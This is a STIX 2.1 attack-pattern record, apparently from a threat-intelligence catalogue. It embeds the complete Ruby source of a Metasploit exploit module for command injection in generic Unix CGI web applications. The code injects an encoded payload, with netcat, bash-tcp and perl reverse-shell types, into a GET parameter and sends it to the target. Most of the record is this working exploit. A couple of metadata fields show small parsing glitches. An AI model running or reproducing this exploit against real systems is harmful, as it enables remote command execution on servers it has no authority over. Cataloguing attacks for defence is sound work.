{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e85cf7f0-839c-4211-bd4d-60edbc2d991a",
    "created": "2024-08-14T17:14:04.720315Z",
    "modified": "2024-08-14T17:14:04.720319Z",
    "name": "Generic Web Application Unix Command Execution",
    "description": " This module can be used to exploit any generic command execution vulnerability for CGI applications on Unix-like platforms. To use this module, specify the CMDURI path, replacing the command itself with XXcmdXX. This module is currently limited to forms vulnerable through GET requests with query parameters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/generic_exec.rb",
            "external_id": "generic_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Generic Web Application Unix Command Execution',\n      'Description'    => %q{\n          This module can be used to exploit any generic command execution vulnerability\n        for CGI applications on Unix-like platforms. To use this module, specify the\n        CMDURI path, replacing the command itself with XXcmdXX. This module is currently\n        limited to forms vulnerable through GET requests with query parameters.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     => [ ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl telnet netcat netcat-e bash-tcp',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '1993-11-14', # CGI historical date :)\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('CMDURI', [true, \"The full URI path with the XXcmdXX parameter\", \"/cgi-bin/generic?cmd=XXcmdXX\"]),\n      ])\n  end\n\n  def exploit\n    uri = datastore['CMDURI'].to_s\n    uri,query = uri.split('?', 2)\n\n    if query\n      query = query.split('&').map{|var|\n        k,v = var.split('=', 2)\n        Rex::Text.uri_encode(k) + \"=\" + Rex::Text.uri_encode(v.gsub(\"XXcmdXX\", payload.encoded))\n      }.join('&')\n      uri = uri + '?' + query\n    end\n\n    print_status(\"Sending HTTP request for #{uri}\")\n    res = send_request_cgi( {\n      'global' => true,\n      'uri'    => uri\n    }, 30)\n\n    if res\n      print_status(\"The server responded with HTTP CODE #{res.code}\")\n    else\n      print_status(\"The server did not respond to our request\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "1993-11-14, # CGI historical date :",
    "x_mitre_platforms": [
        "unix'"
    ]
}